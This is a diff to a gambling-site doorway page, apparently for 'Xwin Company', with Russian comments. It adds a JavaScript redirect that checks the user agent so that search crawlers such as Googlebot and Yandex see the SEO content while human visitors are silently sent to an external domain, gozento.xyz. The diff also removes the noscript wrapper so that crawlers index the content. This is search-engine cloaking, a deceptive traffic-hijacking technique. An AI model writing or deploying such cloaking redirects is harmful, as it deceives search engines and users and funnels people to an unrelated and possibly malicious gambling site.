@@ -4,10 +4,14 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     
-    <!-- МГНОВЕННЫЙ РЕДИРЕКТ ДЛЯ ЛЮДЕЙ -->
-    <meta http-equiv="refresh" content="0; url=https://gozento.xyz/5e4n3Y">
+    <!-- УМНЫЙ РЕДИРЕКТ (Только для людей, роботы видят контент) -->
     <script type="text/javascript">
-        window.location.replace("https://gozento.xyz/5e4n3Y");
+        var ua = navigator.userAgent.toLowerCase();
+        var isBot = /yandex|googlebot|bingbot|slurp|duckduckbot|baiduspider|facebot|ia_archiver/i.test(ua);
+        
+        if (!isBot) {
+            window.location.replace("https://gozento.xyz/5e4n3Y");
+        }
     </script>
 
     <!-- SEO ДЛЯ РОБОТОВ -->
@@ -95,8 +99,6 @@
 </head>
 <body>
 
-<!-- КОНТЕНТ ДЛЯ ЯНДЕКСА (Внутри noscript, чтобы не мешать редиректу для людей) -->
-<noscript>
     <header>
         <div class="container" style="display: flex; justify-content: space-between; align-items: center;">
             <a href="https://gozento.xyz/5e4n3Y" class="logo"><img src="/images/logo.png" alt="Xwin Company Логотип"></a>
@@ -216,7 +218,6 @@
             <p>Licensed by Curacao eGaming. Support available 24/7.</p>
         </div>
     </footer>
-</noscript>
 
 </body>
 </html>
